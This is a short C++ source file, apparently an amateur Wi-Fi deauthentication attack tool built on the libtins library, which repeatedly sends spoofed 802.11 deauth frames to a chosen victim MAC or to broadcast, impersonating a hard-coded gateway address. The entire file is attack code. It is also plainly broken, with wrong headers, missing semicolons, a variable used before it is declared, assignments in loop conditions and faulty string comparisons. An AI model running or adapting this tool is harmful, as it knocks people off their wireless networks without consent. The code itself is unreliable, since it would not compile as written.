#include <stdio>
#include <unistd.h>
#include <iostream>
#include <tins/tins.h>
#include <libtins>
#include <cassert>
#include <string>

using namespace std
//NOTE: INSTALL LIBTINS LIBRARY 
int main()
{
	string broadcastmac = "FF:FF:FF:FF:FF:FF";

	string victimmac;

	string broadorvic;

	string gatewaymac = "e4:57:40:1b:7a:90";

	string interfacename = "wlan0";

	cout<<"Would you like to target 1 victim, or send a broadcast?"
	cin>>broadorvic
		if (broadorvic == "1 victim" || "Victim" || "victim")
		{
			cout << "Enter the victim's MAC";
			cin >> victimmac;
			cout << "Is " << victimmac << "correct? If not, shut the program down and try again";
			Sleep(5000);
		}

	while (broadorvic = "broadcast" || "Broadcast" && 1 != 9)
	{
		deauth.addr1(broadcastmac);
		deauth.addr2(gatewaymac);

		Dot11Deauthentication deauth;
		RadioTap radio = RadioTap() / deauth; //make 802.11 packet
		PacketSender sender(interfacename); //sender function defined
		sender.send(radio) //send the 802.11 packet
		Sleep(100000) //delay
	}

	while (broadorvic = "Victim" || "victim" || "1 victim" && 1 != 9)
	{
		deauth.addr1(victimmac);
		deauth.addr2(gatewaymac);

		Dot11Deauthentication deauth;
		RadioTap radio = RadioTap() / deauth; //make 802.11 packet
		PacketSender sender(interfacename); //sender function defined
		sender.send(radio) //send the 802.11 packet
			Sleep(100000) //delay
	}


}